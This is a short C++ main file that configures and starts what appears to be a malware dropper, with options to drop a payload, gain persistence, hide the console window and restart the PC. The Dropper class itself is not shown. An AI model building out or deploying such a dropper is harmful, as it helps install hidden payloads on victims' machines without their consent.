// Main.cpp : Defines entry point.

#include "Includes.h"

int main() {

	Config config;
	Dropper dropper;

	config.Drop = true;
	config.Persistence = false;
	config.HideConsoleWindow = false;
	config.RestartPC = false;

	dropper.Init(config);

	return 0;
}